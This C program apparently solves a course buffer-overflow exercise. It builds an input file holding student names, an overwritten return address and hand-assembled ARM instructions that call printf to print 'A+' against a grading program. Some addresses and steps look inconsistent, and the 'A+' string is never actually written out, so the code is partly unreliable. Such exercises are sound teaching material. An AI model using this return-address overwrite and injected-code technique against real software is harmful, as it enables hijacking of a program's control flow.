#include <stdio.h>
#include "miniassembler.h"

int main(void) {
    FILE *dataAplus;
    unsigned int payloadAddress, printfAddress;
    unsigned int ldrInstr, blInstr;
    const char *aPlusString = "A+\0"; 

    /* Open the dataAplus file for writing */
    dataAplus = fopen("dataAplus", "w+");

    /* Write student names and null byte */
    fprintf(dataAplus, "Alex & Matt");
    putc('\0', dataAplus);

    printfAddress = 0x400690; 
    
    /* Calculate the address where the payload will be loaded */
    payloadAddress = MiniAssembler_adr(0, 0x420044, 0x420064);
    /* Overwrite return address with address of our payload */
    fwrite(&payloadAddress, sizeof(payloadAddress), 1, dataAplus);

    /* Payload setup: Load the address of "A+" into a register (e.g., X0) for printf */
    /* This address must be correctly calculated based on your payload location */
    unsigned long aPlusAddress = 0x420048;
    ldrInstr = MiniAssembler_ldr(0, aPlusAddress); 
    fwrite(&ldrInstr, sizeof(ldrInstr), 1, dataAplus);

    /* Branch to printf to print using the x0 register*/
    blInstr = MiniAssembler_bl(printfAddress, 0x42006c);
    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);

    /* Branch back to main function after printf */
    blInstr = MiniAssembler_bl(0x40089c, printfAddress);
    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
    
    
    /* Close the file */
    fclose(dataAplus);
    return 0;
}
